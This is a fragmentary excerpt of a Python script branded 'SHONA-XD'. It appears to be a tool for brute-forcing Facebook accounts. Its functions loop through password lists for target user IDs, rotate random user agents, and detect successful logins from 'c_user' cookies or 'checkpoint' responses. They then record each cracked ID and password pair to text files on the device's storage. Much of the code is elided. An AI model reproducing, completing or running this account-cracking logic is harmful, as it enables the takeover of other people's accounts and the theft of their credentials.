...
def fia():    
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/SHONA-XD.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[SHONA-XD] %s|\033[0;92mOK:-%s \033[0;97m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[0;97m[SHONA-XD-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/SHONA-XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[SHONA-XD-OK] '+ids+' | '+pas+'\033[0;92m')
					
					open('/sdcard/SHONA-XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[SHONA-XD] %s|\033[1;92mOK:-%s \033[0;92m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[0;92m[SHONA-XD-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;97m[SHONA-XD-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[0;92mSHONA-XD\033[0;92m] %s|OK:-%s \r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\x1b[1;92m[SHONA-XD-OK] '+cid+' | '+ps+'\033[0;92m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[38;5;208m[SHONA-XD-CP] '+cid+' | '+ps+'\033[0;97m')
